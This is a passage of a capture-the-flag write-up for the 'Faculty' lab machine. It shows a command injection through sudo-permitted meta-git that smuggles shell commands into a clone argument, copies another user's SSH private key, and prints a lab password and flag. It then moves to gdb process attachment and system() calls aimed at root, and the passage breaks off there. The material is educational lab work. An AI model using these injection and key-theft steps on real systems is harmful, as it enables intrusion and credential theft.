<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gbyolo@faculty:~$</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> user.txt</span>
<span id="cb12-2"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gbyolo</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gbyolo</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gbyolo</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb12-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">cat:</span> user.txt: No such file or directory</span></code></pre></div>
<p>We don’t have <code>user.txt</code> right yet, but we can confirm that <code>gbyolo:Co.met06aci.dly53ro.per</code> is correct and we have a foothold on the victim.</p>
</section>
<section id="step-4" class="level3">
<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
<p>Pivot! Start with usual <code>sudo -l</code></p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gbyolo@faculty:~$</span> sudo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-l</span></span>
<span id="cb13-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[sudo]</span> password for gbyolo: </span>
<span id="cb13-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Matching</span> Defaults entries for gbyolo on faculty:</span>
<span id="cb13-4">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">env_reset,</span> mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
<span id="cb13-5"></span>
<span id="cb13-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">User</span> gbyolo may run the following commands on faculty:</span>
<span id="cb13-7">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/local/bin/meta-git</span></span></code></pre></div>
<p>We’re able to run <code>/usr/local/bin/meta-git</code> as user <code>developer</code>, seems fitting and what we should use to pivot. Reading about <code>meta-git</code> there is a <code>RCE</code> due to <a href="https://hackerone.com/reports/728040">lack of input formating</a>.</p>
<p>Lets try a simple PoC and create a file named <code>test</code>:</p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gbyolo@faculty:/dev/shm$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb14-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 0</span>
<span id="cb14-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxrwt</span>  3 root root   60 Aug 26 10:41 .</span>
<span id="cb14-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 18 root root 3940 Aug 26 08:00 ..</span>
<span id="cb14-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span>  4 root root   80 Aug 26 08:00 multipath</span>
<span id="cb14-6"></span>
<span id="cb14-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gbyolo@faculty:/dev/shm$</span> sudo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> developer /usr/local/bin/meta-git clone <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'exploit.se||touch test'</span></span>
<span id="cb14-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">meta</span> git cloning into <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'exploit.se||touch test'</span> at exploit.se<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">||</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">touch</span> test</span>
<span id="cb14-9"></span>
<span id="cb14-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">exploit.se</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">||</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">touch</span> test:</span>
<span id="cb14-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fatal:</span> repository <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'exploit.se'</span> does not exist</span>
<span id="cb14-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">exploit.se</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">||</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">touch</span> test ✓</span>
<span id="cb14-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">node:8010</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UnhandledPromiseRejectionWarning:</span> Error: ENOENT: no such file or directory, chdir <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'/dev/shm/exploit.se||touch test'</span></span>
<span id="cb14-14">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> process.chdir <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">internal/process/main_thread_only.js:31:12</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-15">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> exec <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-16">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> execPromise.then.catch.errorMessage <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-17">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> process._tickCallback <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">internal/process/next_tick.js:68:7</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-18">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> Function.Module.runMain <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">internal/modules/cjs/loader.js:834:11</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-19">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> startup <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">internal/bootstrap/node.js:283:19</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-20">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> bootstrapNodeJSCore <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">internal/bootstrap/node.js:623:3</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-21"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">node:8010</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UnhandledPromiseRejectionWarning:</span> Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rejection</span> id: 1<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-22"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">node:8010</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[DEP0018]</span> DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.</span>
<span id="cb14-23"></span>
<span id="cb14-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gbyolo@faculty:/dev/shm$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb14-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 0</span>
<span id="cb14-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxrwt</span>  3 root      root       100 Aug 26 11:00 .</span>
<span id="cb14-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 18 root      root      3940 Aug 26 08:00 ..</span>
<span id="cb14-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw-r--</span>  1 developer developer    0 Aug 26 11:00 exploit.se</span>
<span id="cb14-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span>  4 root      root        80 Aug 26 08:00 multipath</span>
<span id="cb14-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw-r--</span>  1 developer developer    0 Aug 26 11:00 test</span></code></pre></div>
<p>Now weaponize and steal <code>id_rsa</code>:</p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gbyolo@faculty:/dev/shm$</span> sudo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> developer /usr/local/bin/meta-git clone <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'exploit.se||cp /home/developer/.ssh/id_rsa . &amp;&amp; chmod 777 id_rsa'</span></span>
<span id="cb15-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">meta</span> git cloning into <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'exploit.se||cp /home/developer/.ssh/id_rsa . &amp;&amp; chmod 777 id_rsa'</span> at id_rsa . <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chmod</span> 777 id_rsa</span>
<span id="cb15-3"></span>
<span id="cb15-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">id_rsa</span> . <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chmod</span> 777 id_rsa:</span>
<span id="cb15-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fatal:</span> destination path <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'exploit.se'</span> already exists and is not an empty directory.</span>
<span id="cb15-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">chmod:</span> changing permissions of <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'.'</span>: Operation not permitted</span>
<span id="cb15-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">id_rsa</span> . <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chmod</span> 777 id_rsa: command <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'git clone exploit.se||cp /home/developer/.ssh/id_rsa . &amp;&amp; chmod 777 id_rsa id_rsa . &amp;&amp; chmod 777 id_rsa'</span> exited with error: Error: Command failed: git clone exploit.se<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">||</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cp</span> /home/developer/.ssh/id_rsa . <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chmod</span> 777 id_rsa id_rsa . <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chmod</span> 777 id_rsa</span>
<span id="cb15-8"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">node:8146</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UnhandledPromiseRejectionWarning:</span> Error: ENOENT: no such file or directory, chdir <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'/dev/shm/id_rsa . &amp;&amp; chmod 777 id_rsa'</span></span>
<span id="cb15-9">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> process.chdir <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">internal/process/main_thread_only.js:31:12</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb15-10">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> exec <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb15-11">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> execPromise.then.catch.errorMessage <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb15-12">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> process._tickCallback <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">internal/process/next_tick.js:68:7</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb15-13">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> Function.Module.runMain <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">internal/modules/cjs/loader.js:834:11</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb15-14">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> startup <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">internal/bootstrap/node.js:283:19</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb15-15">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> bootstrapNodeJSCore <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">internal/bootstrap/node.js:623:3</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb15-16"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">node:8146</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UnhandledPromiseRejectionWarning:</span> Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rejection</span> id: 2<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb15-17"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">node:8146</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[DEP0018]</span> DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.</span>
<span id="cb15-18"></span>
<span id="cb15-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gbyolo@faculty:/dev/shm$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb15-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 4</span>
<span id="cb15-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxrwt</span>  3 root      root       120 Aug 26 11:03 .</span>
<span id="cb15-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 18 root      root      3940 Aug 26 08:00 ..</span>
<span id="cb15-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw-r--</span>  1 developer developer    0 Aug 26 11:00 exploit.se</span>
<span id="cb15-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxrwx</span>  1 developer developer 2602 Aug 26 11:03 id_rsa</span>
<span id="cb15-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span>  4 root      root        80 Aug 26 08:00 multipath</span>
<span id="cb15-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw-r--</span>  1 developer developer    0 Aug 26 11:00 test</span></code></pre></div>
<p>Login and grab <code>user.txt</code>:</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  faculty vim developer-id_rsa          </span>
<span id="cb16-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  faculty chmod 400 developer-id_rsa </span>
<span id="cb16-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  faculty ssh developer@faculty.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> developer-id_rsa</span>
<span id="cb16-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer@faculty:~$</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> user.txt</span>
<span id="cb16-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1001<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1002<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1002<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,1001</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">debug</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,1003</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">faculty</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb16-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">904b8c9a6982c444e519674b88a31b25</span></span></code></pre></div>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>As seen from <code>id</code> user <code>developer</code> is part of group <code>debug</code>, this is interesting. See if there are any files owned by group <code>debug</code>:</p>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer@faculty:/$</span> find / <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-group</span> debug <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /dev/null</span>
<span id="cb17-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/bin/gdb</span></span></code></pre></div>
<p>With <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#gdb">GDB</a> we can attach different processes and dump their memory, in hope of finding credentials.</p>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gdb</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>FTP_PROCESS_PID<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb18-2"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gdb</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">info</span> proc mappings</span>
<span id="cb18-3"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gdb</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">q</span></span>
<span id="cb18-4"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gdb</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dump</span> memory /tmp/<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>name<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>.mem <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>START_HEAD<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>END_HEAD<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb18-5"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gdb</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">q</span></span>
<span id="cb18-6"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">strings</span> /tmp/<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>name<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>.mem</span></code></pre></div>
<p>Trying to dump a lot of processes I find nothing and decide to continue looking for other ways to use gdb.</p>
<p>After a while I come across <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace">this information</a> from HackTricks:</p>
<blockquote class="blockquote">
<p><em>“If <strong>GDB</strong> is installed (or you can install it with <code>apk add gdb</code> or <code>apt install gdb</code> for example) you can <strong>debug a process from the host</strong> and make it call the <code>system</code> function. (This technique also requires the capability <code>SYS_ADMIN</code>)<strong>.</strong>”</em></p>
</blockquote>
<p>With this example attached to it:</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gdb</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> 1234</span>
<span id="cb19-2"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gdb</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">call</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">system</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ls"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb19-3"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gdb</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">call</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
